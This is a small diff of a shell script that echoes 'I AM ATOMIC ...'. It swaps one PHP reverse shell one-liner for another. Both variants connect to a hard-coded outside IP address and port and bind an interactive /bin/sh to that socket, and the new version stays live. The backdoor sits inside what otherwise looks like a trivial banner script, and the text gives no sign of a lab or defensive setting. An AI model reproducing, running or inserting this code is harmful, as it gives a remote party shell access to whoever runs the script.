@@ -12,5 +12,5 @@ clear
 echo "I AM ATOMIC ..."
 #espeak -s 150 -p 50 "I AM ATOMIC."
 # Add PHP reverse shell command with nohup
-php -r '$sock=fsockopen("206.189.80.59",22436);exec("/bin/sh -i <&3 >&3 2>&3");' 
-#php -r '$sock=fsockopen("206.189.80.59",22436);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
+#php -r '$sock=fsockopen("206.189.80.59",22436);exec("/bin/sh -i <&3 >&3 2>&3");' 
+php -r '$sock=fsockopen("206.189.80.59",22436);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
